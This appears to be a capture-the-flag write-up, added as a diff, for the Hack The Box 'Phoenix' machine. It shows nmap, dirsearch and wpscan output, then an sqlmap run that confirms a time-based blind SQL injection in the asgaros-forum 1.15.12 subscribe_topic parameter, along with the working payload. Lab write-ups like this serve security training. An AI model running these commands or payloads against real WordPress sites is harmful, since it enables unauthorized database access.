@@ -1,0 +1,332 @@
+─(root㉿kali)-[~]
+└─# nmap -A -sC -sV 10.10.11.149
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-02 16:24 UTC
+Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 65.62% done; ETC: 16:24 (0:00:08 remaining)
+Stats: 0:00:29 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 67.33% done; ETC: 16:24 (0:00:14 remaining)
+Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 70.23% done; ETC: 16:25 (0:00:25 remaining)
+Stats: 0:01:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 72.12% done; ETC: 16:26 (0:00:30 remaining)
+Stats: 0:02:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 76.72% done; ETC: 16:26 (0:00:37 remaining)
+Stats: 0:02:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 76.83% done; ETC: 16:26 (0:00:37 remaining)
+Stats: 0:03:55 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 87.83% done; ETC: 16:28 (0:00:32 remaining)
+Stats: 0:07:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 99.99% done; ETC: 16:31 (0:00:00 remaining)
+Stats: 0:10:51 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
+Traceroute Timing: About 32.26% done; ETC: 16:35 (0:00:00 remaining)
+Stats: 0:11:07 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 97.60% done; ETC: 16:35 (0:00:00 remaining)
+Stats: 0:11:07 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 97.60% done; ETC: 16:35 (0:00:00 remaining)
+Stats: 0:11:07 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 97.60% done; ETC: 16:35 (0:00:00 remaining)
+Stats: 0:11:42 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.52% done; ETC: 16:35 (0:00:00 remaining)
+Stats: 0:11:49 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.52% done; ETC: 16:36 (0:00:00 remaining)
+Nmap scan report for 10.10.11.149 (10.10.11.149)
+Host is up (0.55s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 9d:f3:87:cd:34:75:83:e0:3f:50:d8:39:c6:a5:32:9f (RSA)
+|   256 ab:61:ce:eb:ed:e2:86:76:e9:e1:52:fa:a5:c7:7b:20 (ECDSA)
+|_  256 26:2e:38:ca:df:72:d4:54:fc:75:a4:91:65:cc:e8:b0 (ED25519)
+80/tcp  open  http     Apache httpd
+|_http-server-header: Apache
+|_http-title: Did not follow redirect to https://phoenix.htb/
+443/tcp open  ssl/http Apache httpd
+| tls-alpn: 
+|   h2
+|_  http/1.1
+| ssl-cert: Subject: commonName=phoenix.htb/organizationName=Phoenix Security Ltd./stateOrProvinceName=Arizona/countryName=US
+| Not valid before: 2022-02-15T20:08:43
+|_Not valid after:  2032-02-13T20:08:43
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache
+|_http-title: 400 Bad Request
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=7/2%OT=22%CT=1%CU=32341%PV=Y%DS=2%DC=T%G=Y%TM=62C0742A
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)SEQ(S
+OS:P=FC%GCD=1%ISR=10F%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M
+OS:54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE8
+OS:8%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%
+OS:CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y
+OS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%R
+OS:D=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%
+OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPC
+OS:K=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1025/tcp)
+HOP RTT       ADDRESS
+1   248.26 ms 10.10.14.1 (10.10.14.1)
+2   634.72 ms 10.10.11.149 (10.10.11.149)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 762.97 seconds
+
+
+
+
+As we enumerate the website we just got more clear tat  wordpress is or destiny 
+so lets just get into  it
+
+┌──(root㉿kali)-[~/phoenix]
+└─# dirsearch -e php,html,js,zip,txt,tar,gz,exe -u https://10.10.11.149 -r -R 2
+
+
+
+
+┌──(root㉿kali)-[~/phoenix]
+└─# wpscan --url https://phoenix.htb --clear-cache --enumerate at,ap --disable-tls-checks --random-user-agent --plugins-detection passive --plugins-version-detection passive 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: https://phoenix.htb/ [10.10.11.149]
+[+] Started: Sat Jul  2 17:09:29 2022
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: server: Apache
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: https://phoenix.htb/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] WordPress version 5.9 identified (Insecure, released on 2022-01-25).
+ | Found By: Rss Generator (Passive Detection)
+ |  - https://phoenix.htb/feed/, <generator>https://wordpress.org/?v=5.9</generator>
+ |  - https://phoenix.htb/comments/feed/, <generator>https://wordpress.org/?v=5.9</generator>
+
+[+] WordPress theme in use: coming-soon-event
+ | Location: https://phoenix.htb/wp-content/themes/coming-soon-event/
+ | Latest Version: 1.0.8 (up to date)
+ | Last Updated: 2021-08-24T00:00:00.000Z
+ | Readme: https://phoenix.htb/wp-content/themes/coming-soon-event/readme.txt
+ | Style URL: https://phoenix.htb/wp-content/themes/coming-soon-event/style.css?ver=1.0.0
+ | Style Name: Coming Soon Event
+ | Description: The Coming Soon Event under construction theme will play a big role in boosting up the business and ...
+ | Author: blogwp
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ | Confirmed By: Css Style In 404 Page (Passive Detection)
+ |
+ | Version: 1.0.8 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - https://phoenix.htb/wp-content/themes/coming-soon-event/style.css?ver=1.0.0, Match: 'Version: 1.0.8'
+
+[+] Enumerating All Plugins (via Passive Methods)
+[+] Checking Plugin Versions (via Passive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] accordion-slider-gallery
+ | Location: https://phoenix.htb/wp-content/plugins/accordion-slider-gallery/
+ | Latest Version: 2.2
+ | Last Updated: 2022-05-07T11:22:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ | Confirmed By: Urls In 404 Page (Passive Detection)
+ |
+ | The version could not be determined.
+
+[+] asgaros-forum
+ | Location: https://phoenix.htb/wp-content/plugins/asgaros-forum/
+ | Last Updated: 2022-01-30T12:54:00.000Z
+ | [!] The version is out of date, the latest version is 2.0.0
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ | Confirmed By: Urls In 404 Page (Passive Detection)
+ |
+ | Version: 1.15.12 (10% confidence)
+ | Found By: Query Parameter (Passive Detection)
+ |  - https://phoenix.htb/wp-content/plugins/asgaros-forum/skin/widgets.css?ver=1.15.12
+
+[+] photo-gallery-builder
+ | Location: https://phoenix.htb/wp-content/plugins/photo-gallery-builder/
+ | Latest Version: 2.3
+ | Last Updated: 2022-05-07T11:20:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ | Confirmed By: Urls In 404 Page (Passive Detection)
+ |
+ | The version could not be determined.
+
+[+] pie-register
+ | Location: https://phoenix.htb/wp-content/plugins/pie-register/
+ | Latest Version: 3.8
+ | Last Updated: 2022-06-30T05:23:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ | Confirmed By: Urls In 404 Page (Passive Detection)
+ |
+ | The version could not be determined.
+
+[+] timeline-event-history
+ | Location: https://phoenix.htb/wp-content/plugins/timeline-event-history/
+ | Latest Version: 2.3
+ | Last Updated: 2022-06-30T10:12:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ | Confirmed By: Urls In 404 Page
+[+] Checking Theme Versions (via Passive and Aggressive Methods)
+
+[i] Theme(s) Identified:
+
+[+] coming-soon-event
+ | Location: https://phoenix.htb/wp-content/themes/coming-soon-event/
+ | Latest Version: 1.0.8
+ | Last Updated: 2021-08-24T00:00:00.000Z
+ | Style URL: https://phoenix.htb/wp-content/themes/coming-soon-event/style.css
+ | Style Name: Coming Soon Event
+ | Description: The Coming Soon Event under construction theme will play a big role in boosting up the business and ...
+ | Author: blogwp
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ | Confirmed By: Urls In 404 Page (Passive Detection)
+ |
+ | The version could not be determined.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Sat Jul  2 17:57:12 2022
+[+] Requests Done: 24303
+[+] Cached Requests: 8
+[+] Data Sent: 5.933 MB
+[+] Data Received: 4.401 MB
+[+] Memory used: 321.727 MB
+[+] Elapsed time: 00:47:43
+
+
+Wpscan reveals an installed plugin called asgaros-forum on version 1.15.12 , whilst the latest according
+to the output is 2.0.0 . Since this is an outdated version we can search online for possible vulnerabilities
+related to the installed version.
+Indeed, according to this post version 1.15.12 is vulnerable to Unauthenticated Blind Time Based SQL
+Injection .
+First of all, we have to verify that the /forum endpoint exists.
+
+Now that we have verified that /forums is a valid endpoint we can use SQLmap to perform the attack
+
+
+
+┌──(root㉿kali)-[~/phoenix]
+└─# sqlmap --url "https://phoenix.htb/forum/?subscribe_topic=*" --keep-alive --dbms=mysql --risk 3 --technique=TB --thread=10 --random-agent --level 3 --batch 
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.6.5#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:55:50 /2022-07-02/
+
+[17:55:50] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.10) Gecko/20070530 Firefox/1.0.4 (Debian package 1.0.4-2sarge17)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
+[17:55:50] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
+[17:55:50] [INFO] testing connection to the target URL
+[17:55:51] [WARNING] it appears that you have been blocked by the target server
+[17:55:51] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests
+[17:55:51] [INFO] checking if the target is protected by some kind of WAF/IPS
+[17:55:52] [INFO] testing if the target URL content is stable
+[17:55:52] [INFO] target URL content is stable
+[17:55:52] [INFO] testing if URI parameter '#1*' is dynamic
+[17:55:53] [WARNING] URI parameter '#1*' does not appear to be dynamic
+[17:55:54] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+[17:55:54] [INFO] testing for SQL injection on URI parameter '#1*'
+[17:55:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[17:56:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[17:56:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[17:56:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[17:56:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[17:57:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[17:57:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
+[17:57:34] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[17:57:35] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[17:57:36] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[17:57:36] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[17:57:37] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[17:57:37] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[17:57:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[17:57:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[17:58:01] [WARNING] turning off pre-connect mechanism because of connection reset(s)
+[17:58:01] [WARNING] there is a possibility that the target (or WAF/IPS) is resetting 'suspicious' requests
+[17:58:01] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
+[17:58:01] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')
+[17:58:03] [WARNING] reflective value(s) found and filtering out
+[17:58:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[17:58:58] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[17:59:42] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[18:00:26] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+
+[18:01:31] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[18:01:35] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[18:01:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[18:01:40] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[18:02:01] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+[18:02:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[18:02:42] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
+[18:03:03] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[18:03:17] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
+[18:03:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[18:03:40] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
+[18:03:51] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
+[18:04:12] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
+[18:04:32] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
+[18:04:54] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
+[18:05:15] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+[18:05:37] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
+[18:05:58] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[18:06:20] [INFO] testing 'MySQL OR time-based blind (ELT)'
+[18:06:41] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[18:07:02] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+[18:07:15] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 time-based blind - Parameter replace' injectable 
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) value? [Y/n] Y
+[18:07:15] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
+URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 780 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+    Payload: https://phoenix.htb:443/forum/?subscribe_topic=(CASE WHEN (9448=9448) THEN SLEEP(5) ELSE 9448 END)
+---
+[18:08:15] [INFO] the back-end DBMS is MySQL
+[18:08:15] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+back-end DBMS: MySQL >= 5.0.12
+[18:08:20] [WARNING] HTTP error codes detected during run:
+403 (Forbidden) - 208 times, 501 (Not Implemented) - 1 times
+[18:08:20] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/phoenix.htb'
+
+[*] ending @ 18:08:20 /2022-07-02/
+
+
